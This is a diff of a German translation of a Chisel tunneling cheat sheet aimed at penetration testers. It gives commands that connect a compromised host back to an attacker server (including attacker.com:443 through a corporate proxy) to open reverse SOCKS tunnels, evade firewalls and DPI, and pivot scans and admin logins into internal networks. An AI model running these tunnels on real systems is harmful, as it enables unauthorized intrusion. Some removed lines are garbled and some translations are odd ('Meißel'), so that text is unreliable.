@@ -1,12 +1,16 @@
-# 🚇 Chisel – vollständiger Spickzettel
-
 <!-- language-home-navigation -->
 [🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🚇 Meißel – Vollständiger Cheatsheet
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
    ██████╗██╗  ██╗██╗███████╗███████╗██╗     
   ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
@@ -16,7 +20,6 @@
    ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
       Fast TCP/UDP Tunnel over HTTP via SSH
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
   <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
@@ -25,51 +28,50 @@
 </p>
 
 <p align="center">
-  <b>⚡ Fast TCP/UDP tunnel transported over HTTP, secured via SSH, packaged as a single portable binary</b>
+  <b>⚡ Schneller TCP/UDP-Tunnel, der über HTTP transportiert, über SSH gesichert und als einzelne tragbare Binärdatei verpackt ist</b>
 </p>
 
 ---
 
 ## 📋 Inhaltsverzeichnis
 
-- [Einführung](#-introduction)
-- [Funktionsweise](#-how-it-works)
-- [Installation](#-installation)
-- [Architecture & Tunnel Modes](#-architecture--tunnel-modes)
-- [Installation](#-standard-pentest-setup-reverse-socks5-proxy)
-  - [Step 1: Start Server on Attacker](#step-1-start-server-on-attacker)
-  - [Step 1: Start Server on Attacker](#step-2-connect-client-from-target)
-  - [Step 3: Configure Proxychains](#step-3-configure-proxychains)
-  - [Step 3: Configure Proxychains](#step-4-execute-tools-over-the-tunnel)
-- [Local Port Forwarding](#-local-port-forwarding)
-- [Remote Port Forwarding (Catching Inbound Traffic)](#-remote-port-forwarding-catching-inbound-traffic)
-- [Authentication & Fingerprint Pinning](#-authentication--fingerprint-pinning)
-- [Egress Evasion & HTTP Proxy Chaining](#-egress-evasion--http-proxy-chaining)
-- [Chisel vs Ligolo-ng vs SSH](#-chisel-vs-ligolo-ng-vs-ssh)
-- [Kurzreferenz](#-quick-reference-table)
-- [Tipps und bewährte Vorgehensweisen](#-tips--best-practices)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Ressourcen und Referenzen](#-resources)
+- [Einführung](#-Einführung)
+- [Wie es funktioniert](#-how-it-works)
+- [Installation](#-Installation)
+- [Architektur- und Tunnelmodi](#-architecture--tunnel-modes)
+- [Standard-Pentest-Setup: Reverse SOCKS5 Proxy](#-standard-pentest-setup-reverse-socks5-proxy)
+  - [Schritt 1: Server beim Angreifer starten](#step-1-start-server-on-attacker)
+  - [Schritt 2: Client vom Ziel verbinden](#step-2-connect-client-from-target)
+  - [Schritt 3: Proxychains konfigurieren](#step-3-configure-proxychains)
+  - [Schritt 4: Tools über den Tunnel ausführen](#step-4-execute-tools-over-the-tunnel)
+- [Lokale Portweiterleitung](#-local-port-forwarding)
+- [Remote-Port-Weiterleitung (Eingehenden Datenverkehr abfangen)](#-remote-port-forwarding-catcher-inbound-traffic)
+- [Authentifizierung und Fingerabdruck-Pinning](#-authentication--fingerprint-pinning)
+- [Egress-Umgehung und HTTP-Proxy-Verkettung](#-egress-evasion--http-proxy-chaining)
+- [Chisel vs. Ligolo-ng vs. SSH](#-chisel-vs-ligolo-ng-vs-ssh)
+- [Kurzreferenztabelle](#-quick-reference-table)
+- [Tipps und Best Practices](#-tips--best-practices)
+- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
+- [Ressourcen](#-Ressourcen)
 
 ---
 
 ## 🎯 Einführung
 
-**Chisel** is an open-source, cross-platform tunneling tool written in Go that encapsulates secure SSH sessions within standard HTTP/WebSocket connections.
+**Chisel** ist ein in Go geschriebenes, plattformübergreifendes Open-Source-Tunneling-Tool, das sichere SSH-Sitzungen in Standard-HTTP/WebSocket-Verbindungen kapselt.
 
-Because the traffic looks like standard HTTP/HTTPS or WebSocket communication on the wire, Chisel easily navigates through restrictive firewalls, Deep Packet Inspection (DPI) systems, and corporate web proxies that would normally block raw SSH or VPN traffic.
+Da der Datenverkehr auf dem Kabel wie normale HTTP/HTTPS- oder WebSocket-Kommunikation aussieht, navigiert Chisel problemlos durch restriktive Firewalls, Deep Packet Inspection (DPI)-Systeme und Unternehmens-Web-Proxys, die normalerweise rohen SSH- oder VPN-Datenverkehr blockieren würden.
 
-### 🎯 Einführung
+### Schlüsselstärken
 
-- Chisel** is an open-source, cross-platform tunneling tool written in Go that encapsulates secure SSH sessions within standard HTTP/WebSocket connections.
-- 🛡️ **Firewall Evasion:** Tunnels over standard port 80/443 or WebSockets to blend into regular web traffic.
-- 🔒 **Encrypted by Default:** Uses SSH crypto under the hood (ECDSA keys and AES-GCM).
-- 🔄 **SOCKS5 & Port Forwarding:** Creates reverse SOCKS5 proxies or specific local/remote forwarded ports effortlessly.
+- 🚀 **Einzelne Binärdatei:** Enthält sowohl Server als auch Client in einer eigenständigen statisch kompilierten Binärdatei.
+- 🛡️ **Firewall-Umgehung:** Tunnelt über den Standard-Port 80/443 oder WebSockets, um sich in den regulären Webverkehr einzumischen.
+- 🔒 **Standardmäßig verschlüsselt:** Verwendet SSH-Verschlüsselung unter der Haube (ECDSA-Schlüssel und AES-GCM).
+- 🔄 **SOCKS5- und Portweiterleitung:** Erstellt mühelos Reverse-SOCKS5-Proxys oder bestimmte lokal/remote weitergeleitete Ports.
 
 ---
 
-## 🏗️ Funktionsweise
-
+## 🏗️ Wie es funktioniert
 ```
 +------------------------------------+                         +-----------------------------------+
 |          Attacker Machine          |                         |       Compromised Target Host     |
@@ -83,27 +85,21 @@ Because the traffic looks like standard HTTP/HTTPS or WebSocket communication on
 |      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
 +------------------------------------+                         +-----------------------------------+
 ```
-
 ---
 
 ## 📥 Installation
 
 ### Kali Linux
-
 ```bash
 sudo apt update && sudo apt install -y chisel
 ```
-
-### 📥 Installation
-
+### Von der Quelle (Los)
 ```bash
 go install github.com/jpillora/chisel@latest
 ```
+### Vorkompilierte Binärdateien herunterladen
 
-### Download Precompiled Binaries
-
-Aus dem Quellcode (Go)
-
+Laden Sie eigenständige Binärdateien für Linux, Windows und macOS aus den offiziellen Versionen herunter:
 ```bash
 # Attacker Linux 64-bit
 wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
@@ -113,51 +109,43 @@ gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chm
 wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
 gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
 ```
-
 ---
 
-## 🔄 Installation
+## 🔄 Standard-Pentest-Setup: Reverse SOCKS5 Proxy
 
-In standard penetration testing and CTFs, the target machine is behind NAT/firewalls and cannot accept direct inbound connections from you. You must create a **reverse SOCKS5 proxy**.
+Bei Standard-Penetrationstests und CTFs befindet sich der Zielcomputer hinter NAT/Firewalls und kann keine direkten eingehenden Verbindungen von Ihnen akzeptieren. Sie müssen einen **Reverse-SOCKS5-Proxy** erstellen.
 
-### Step 1: Start Server on Attacker
+### Schritt 1: Server auf Angreifer starten
 
-🔄 Installation
-
+Starten Sie den Chisel-Server, der auf Port `8000` (oder `443` zur Umgehung) lauscht, wobei die umgekehrte Portweiterleitung zulässig ist:
 ```bash
 chisel server --reverse -p 8000 -v
 ```
+### Schritt 2: Client vom Ziel verbinden
 
-### Step 1: Start Server on Attacker
+Führen Sie den Client auf dem kompromittierten Computer aus, stellen Sie eine Verbindung zu Ihrer Angreifer-IP her und öffnen Sie einen Reverse-SOCKS5-Proxy:
 
-Start the Chisel server listening on port `8000` (or `443` for evasion) with reverse port forwarding allowed:
-
-#### Linux Target:
+#### Linux-Ziel:
 ```bash
 ./chisel client 192.168.1.100:8000 R:1080:socks
 ```
-
-#### Windows Target:
+#### Windows-Ziel:
 ```powershell
 .\chisel.exe client 192.168.1.100:8000 R:1080:socks
 ```
+> **Ergebnis:** Der Chisel-Server auf Ihrem Angreifer-Rechner öffnet Port `1080` lokal als SOCKS5-Proxy, der über das Ziel geroutet wird!
 
-Linux Target:
+### Schritt 3: Proxychains konfigurieren
 
-### Step 3: Configure Proxychains
-
-Edit `/etc/proxychains4.conf` (or `/etc/proxychains.conf`) on your attacker machine:
-
+Bearbeiten Sie `/etc/proxychains4.conf` (oder `/etc/proxychains.conf`) auf Ihrem Angreifercomputer:
 ```ini
 [ProxyList]
 # protocol  host        port
 socks5      127.0.0.1   1080
 ```
+### Schritt 4: Tools über den Tunnel ausführen
 
-### Step 3: Configure Proxychains
-
-Edit `/etc/proxychains4.conf` (or `/etc/proxychains.conf`) on your attacker machine:
-
+Stellen Sie jedem Tool `proxychains` voran, um es über den internen kompromittierten Host weiterzuleiten:
 ```bash
 # Nmap TCP Connect scan
 proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50
@@ -168,59 +156,51 @@ proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'
 # Evil-WinRM shell to an internal domain controller
 proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
 ```
-
 ---
 
-## 🔀 Local Port Forwarding
+## 🔀 Lokale Portweiterleitung
 
-Forward a specific internal port from behind the target directly to your local attacker machine without needing a full SOCKS proxy.
+Leiten Sie einen bestimmten internen Port hinter dem Ziel direkt an Ihren lokalen Angreifercomputer weiter, ohne dass ein vollständiger SOCKS-Proxy erforderlich ist.
 
-### Praxisbeispiele
+### Beispiel: Zugriff auf den internen Webdienst (Port 80)
 
-🔀 Local Port Forwarding
+Server auf Angreifer (`192.168.1.100:8000`):
 ```bash
 chisel server --reverse -p 8000
 ```
-
-Client on target:
+Kunde im Ziel:
 ```bash
 # Forward target's internal localhost:80 to attacker's localhost:8080
 ./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
 ```
+Navigieren Sie nun auf Ihrem Angreifercomputer zu `http://127.0.0.1:8080`, um den internen Webserver anzuzeigen!
 
-Server on attacker (`192.168.1.100:8000`):
+### Beispiel: Interne Datenbank verfügbar machen (MySQL 3306)
 
-### Praxisbeispiele
-
-Client on target:
+Kunde im Ziel:
 ```bash
 ./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
 ```
-
-Connect directly from your attacker terminal:
+Verbinden Sie sich direkt von Ihrem Angreifer-Terminal aus:
 ```bash
 mysql -h 127.0.0.1 -P 3306 -u root -p
 ```
-
 ---
 
-## 🌐 Remote Port Forwarding (Catching Inbound Traffic)
+## 🌐 Remote-Port-Weiterleitung (Eingehenden Datenverkehr abfangen)
 
-Expose a port on the target machine that routes back to a service on your attacker box (useful for serving payloads or catching callbacks).
-
+Machen Sie einen Port auf dem Zielcomputer verfügbar, der zu einem Dienst auf Ihrer Angreifer-Box zurückleitet (nützlich zum Bereitstellen von Nutzlasten oder zum Abfangen von Rückrufen).
 ```bash
 # Target opens port 9000, sending incoming connections to attacker's 9000
 ./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
 ```
-
 ---
 
-## 🔐 Authentication & Fingerprint Pinning
+## 🔐 Authentifizierung und Fingerabdruck-Pinning
 
-In live environments, open Chisel ports can be hijacked by unauthorized parties. Protect your tunnel with authentication:
+In Live-Umgebungen können offene Chisel-Ports von Unbefugten gekapert werden. Schützen Sie Ihren Tunnel mit Authentifizierung:
 
-### Authentication (`--auth`)
-
+### Authentifizierung (`--auth`)
 ```bash
 # Attacker server enforces credentials
 chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"
@@ -228,83 +208,78 @@ chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"
 # Target client authenticates
 ./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
 ```
+### Fingerabdruck-Pinning (`--fingerprint`)
 
-### In live environments, open Chisel ports can be hijacked by unauthorized parties. Protect your tunnel with authentication:
-
-Authentication (`--auth`)
+Wenn der Server startet, druckt er seinen Fingerabdruck des öffentlichen SSH-Schlüssels aus:
 ```
 2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
 ```
-
-Verify it on the client to prevent MITM interception:
+Überprüfen Sie es auf dem Client, um ein MITM-Abfangen zu verhindern:
 ```bash
 ./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
 ```
-
 ---
 
-## 🛡️ Egress Evasion & HTTP Proxy Chaining
+## 🛡️ Egress-Umgehung und HTTP-Proxy-Verkettung
 
-If the internal target can only access the internet through an authenticating corporate proxy:
-
+Wenn das interne Ziel nur über einen authentifizierenden Unternehmens-Proxy auf das Internet zugreifen kann:
 ```bash
 # Route Chisel traffic through an upstream corporate proxy
 ./chisel client --proxy http://proxy.corp.local:8080 \
   --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
   https://attacker.com:443 R:1080:socks
 ```
-
 ---
 
-## ⚖️ Chisel vs Ligolo-ng vs SSH
+## ⚖️ Chisel vs. Ligolo-ng vs. SSH
 
-|Feature|Chisel|Ligolo-ng|SSH Tunneling|
+| Funktion | Meißel | Ligolo-ng | SSH-Tunneling |
 |---------|--------|-----------|---------------|
-|**Primary Method**|SOCKS5 & Port Forwarding|TUN Interface (VPN)|SOCKS5 & Port Forwarding|
-|**Transport Protocol**|HTTP / WebSocket|Raw TLS|SSH (Port 22)|
-|**Firewall Evasion**|⭐⭐⭐⭐⭐ Exceptional|⭐⭐⭐⭐ Very Good|⭐⭐ Poor (Port 22 usually blocked)|
-|**Requires Root/Admin**|❌ No (Userland only)|✅ Yes (To create TUN device)|❌ No|
-|**Nmap SYN Scan (`-sS`)**|❌ No|✅ Yes|❌ No|
-|**UDP Support**|Partial (via SOCKS5)|✅ Full native UDP|❌ Very limited|
+| **Primäre Methode** | SOCKS5 & Portweiterleitung | TUN-Schnittstelle (VPN) | SOCKS5 & Portweiterleitung |
+| **Transportprotokoll** | HTTP / WebSocket | Rohes TLS | SSH (Port 22) |
+| **Firewall-Umgehung** | ⭐⭐⭐⭐⭐ Außergewöhnlich | ⭐⭐⭐⭐ Sehr gut | ⭐⭐ Schlecht (Port 22 normalerweise blockiert) |
+| **Erfordert Root/Administrator**| ❌ Nein (nur Userland) | ✅ Ja (Um ein TUN-Gerät zu erstellen) | ❌ Nein |
+| **Nmap SYN-Scan (`-sS`)**| ❌ Nein | ✅ Ja | ❌ Nein |
+| **UDP-Unterstützung** | Teilweise (über SOCKS5) | ✅ Vollständiges natives UDP | ❌ Sehr begrenzt |
 
 ---
 
-## 📊 Kurzreferenz
+## 📊 Kurzreferenztabelle
 
-|Mode|Befehl|Zweck|
+| Modus | Befehl | Zweck |
 |------|---------|---------|
-|**Server (Reverse)**|`chisel server --reverse -p 8000`|Start reverse server listening on 8000|
-|**Client (Reverse SOCKS5)**|`chisel client <IP>:8000 R:1080:socks`|Create reverse SOCKS5 on attacker's port 1080|
-|**Client (Forward Port)**|`chisel client <IP>:8000 R:8080:127.0.0.1:80`|Map target's port 80 to attacker's 8080|
-|**Client (Expose Attacker Port)**|`chisel client <IP>:8000 4444:127.0.0.1:4444`|Open port 4444 on target routing to attacker|
-|**Auth Server**|`chisel server --reverse --auth "u:p" -p 8000`|Require credentials from connecting clients|
-|**Auth Client**|`chisel client --auth "u:p" <IP>:8000 R:socks`|Connect with credentials|
-|**Keep-Alive Tuning**|`chisel client --keepalive 10s <IP>:8000 R:socks`|Prevent firewall idle session dropouts|
+| **Server (Reverse)** | `chisel server --reverse -p 8000` | Starten Sie die Reverse-Server-Abhörung auf 8000 |
+| **Client (Reverse SOCKS5)** | `chisel client <IP>:8000 R:1080:socks` | Erstellen Sie Reverse SOCKS5 auf dem Port 1080 des Angreifers |
+| **Client (Weiterleitungsport)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Ordnen Sie den Port 80 des Ziels dem 8080 | des Angreifers zu
+| **Client (Angreifer-Port offenlegen)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | Öffnen Sie Port 4444 auf dem Ziel-Routing zum Angreifer |
+| **Auth-Server** | `chisel server --reverse --auth "u:p" -p 8000` | Anmeldeinformationen von verbindenden Clients verlangen |
+| **Auth-Client** | `chisel client --auth "u:p" <IP>:8000 R:socks` | Mit Anmeldeinformationen verbinden |
+| **Keep-Alive-Tuning** | `chisel client --keepalive 10s <IP>:8000 R:socks`| Verhindern Sie Ausfälle von Firewall-Leerlaufsitzungen |
 
 ---
 
-## 💡 Tipps und bewährte Vorgehensweisen
+## 💡 Tipps und Best Practices
 
-1. **Use Port 443 for Maximum Evasion:**
-   Firewalls often inspect traffic on arbitrary ports like 8000 or 8080. Running your Chisel server on port `443` ensures traffic looks identical to HTTPS WebSockets.
-2. **Tune Proxychains Timeout:**
-   If proxychains connections feel sluggish, edit `/etc/proxychains4.conf` and set:
+1. **Verwenden Sie Port 443 für maximale Umgehung:**
+   Firewalls prüfen häufig den Datenverkehr auf beliebigen Ports wie 8000 oder 8080. Durch den Betrieb Ihres Chisel-Servers auf Port `443` wird sichergestellt, dass der Datenverkehr identisch mit HTTPS-WebSockets aussieht.
+2. **Timeout für Proxy-Ketten optimieren:**
+   Wenn sich Proxychain-Verbindungen träge anfühlen, bearbeiten Sie `/etc/proxychains4.conf` und legen Sie Folgendes fest:
    ```ini
    tcp_read_time_out 15000
    tcp_connect_time_out 8000
    ```
-3. **No Root Privileges Required on Target:**
-   Unlike VPN or TUN solutions, Chisel runs purely in user-space. You can run `chisel.exe` or `chisel` as low-privilege service accounts (`www-data`, `nobody`, standard Windows user).
+3. **Auf dem Ziel sind keine Root-Rechte erforderlich:**
+   Im Gegensatz zu VPN- oder TUN-Lösungen läuft Chisel ausschließlich im Benutzerbereich. Sie können `chisel.exe` oder `chisel` als Dienstkonten mit geringen Berechtigungen ausführen (`www-data`, `nobody`, Standard-Windows-Benutzer).
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Rechtlicher Haftungsausschluss
 
-> **IMPORTANT:** Chisel is intended for authorized network testing, red team simulation, and systems administration. Deploying tunneling tools on unauthorized networks violates computer security laws.
+> **WICHTIG:** Chisel ist für autorisierte Netzwerktests, Red-Team-Simulationen und Systemadministration gedacht. Der Einsatz von Tunneling-Tools in nicht autorisierten Netzwerken verstößt gegen Computersicherheitsgesetze.
 
 ---
 
-## 📚 Ressourcen und Referenzen
+## 📚 Ressourcen
 
 - [Chisel GitHub Repository](https://github.com/jpillora/chisel)
-- [Proxychains-NG Project](https://github.com/rofl0r/proxychains-ng)
+- [Proxychains-NG-Projekt](https://github.com/rofl0r/proxychains-ng)
